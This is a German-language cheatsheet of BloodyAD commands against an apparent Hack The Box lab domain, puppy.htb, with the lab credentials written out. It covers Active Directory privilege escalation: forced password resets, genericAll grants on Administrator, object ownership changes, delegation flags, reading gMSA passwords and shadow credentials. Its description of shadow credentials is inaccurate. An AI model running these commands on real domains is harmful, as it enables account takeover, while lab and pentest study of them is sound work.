
## 🩸 BloodyAD Cheatsheet

<br>

🧩 **Retrieve Domain Information**

Zeigt grundlegende Informationen zur Active Directory-Domäne wie Domain-Controller, Domänenfunktionsebene und andere Metadaten an.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get domain
```

<br>

🧩 **Retrieve User Information**

Fragt Active Directory-Objekt (z. B. einen Benutzer) ab und zeigt alle LDAP-Attribute des Zielobjekts.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get object administrator
```

<br>

🧩 **Get groupMembers**

Listet alle Mitglieder der angegebenen AD-Gruppe (z. B. DEVELOPERS) auf und zeigt deren Benutzernamen und Details.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get groupMembers DEVELOPERS
```

<br>

🧩 **Add User To Group**

Zeigt alle Active Directory-Objekte an, auf die der Nutzer levi.james Schreibrechte hat. Mit --detail werden zusätzlich ausführliche Informationen zu den Berechtigungen ausgegeben.
Fügt den Benutzer levi.james zur Gruppe DEVELOPERS im Active Directory hinzu. Dadurch erhält der Nutzer die Rechte und Mitgliedschaften der Zielgruppe.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get writable --detail
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
```

<br>

🧩 **Add New User**

Legt einen neuen Benutzer im Active Directory an, um ihn in der Domäne zu registrieren.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add user <Benutzername>
```

<br>

🧩 **Get Computers**

Listet alle Computerobjekte innerhalb der Active Directory-Domäne auf.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get computers
```
<br>

🧩 **Change Password**

Setzt das Passwort des angegebenen Active Directory-Benutzers ($target_username) auf ein neues Passwort ($new_password). Damit kann der Nutzer das Passwort eines anderen AD-Accounts ändern.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' set password $target_username $new_password
```

<br>

🧩 **Give User GenericAll Rights**

Gewährt dem Benutzer levi.james volle Zugriffsrechte („genericAll“) auf das AD-Objekt „Administrator“. Dadurch kann levi.james alle Eigenschaften und Berechtigungen des Administrator-Kontos ändern.
"Füge der Access Control List (ACL) des Administrator-Objekts hinzu, dass levi.james volle Rechte bekommt.“
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add genericAll "CN=Administrator,CN=Users,DC=puppy,DC=htb" levi.james
```

<br>

🧩 **Write Owner**

Setzt den Besitzer des Active Directory-Objekts „DEVELOPERS“ auf den Benutzer levi.james. Dadurch erhält levi.james volle Kontrolle über dieses Objekt.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' set owner "CN=DEVELOPERS,DC=puppy,DC=htb" levi.james
```

<br>

🧩 **Enable a Disabled Account**

Entfernt das ACCOUNTDISABLE-Flag im User-Account-Control (UAC) des Benutzers joerg.calvus, wodurch das Konto wieder aktiviert wird.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' remove uac "CN=joerg.calvus,OU=Users,DC=puppy,DC=htb" -f ACCOUNTDISABLE
```

<br>

🧩 **Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag**

Fügt dem Benutzerkonto service-account das UAC-Flag TRUSTED_TO_AUTH_FOR_DELEGATION hinzu. Dadurch wird das Konto für die vertrauenswürdige Delegierung autorisiert.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add uac "CN=service-account,OU=Services,DC=puppy,DC=htb" -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

<br>

🧩 **ReadGMSAPassword**

Fragt das Active Directory-Objekt gmsa-web (Managed Service Account) ab und zeigt das Attribut msDS-ManagedPassword mit dem aktuellen verwalteten Passwort an.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get object "CN=gmsa-web,CN=Managed Service Accounts,DC=puppy,DC=htb" --attr msDS-ManagedPassword
```
<br>

🧩 **Modify UPN**
Fragt beim Active Directory-Benutzer joerg das Attribut userPrincipalName ab und zeigt dessen Wert an.
Ändert im Active Directory beim Benutzer joerg das Attribut userPrincipalName auf „joerg2@puppy.htb“. Damit wird der Anmeldename des Nutzers angepasst.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get object "CN=joerg,OU=Users,DC=puppy,DC=htb" --attr userPrincipalName
bloodyAD --host 10.129.204.169 -d puppy.htb -u admin -p 'Passw0rd!' set object "CN=joerg,OU=Users,DC=puppy,DC=htb" userPrincipalName -v "joerg2@puppy.htb"
```

<br>

🧩 **Shadow Credentials**

Fügt dem AD-Benutzer joerg sogenannte Shadow Credentials hinzu, die alternative Anmeldedaten (z. B. für Azure AD Pass-Through Authentication) ermöglichen.
```zsh
bloodyAD --host 10.129.204.169 -d puppy.htb -u admin -p 'Passw0rd!' add shadowCredentials "CN=joerg,OU=Users,DC=puppy,DC=htb"
```


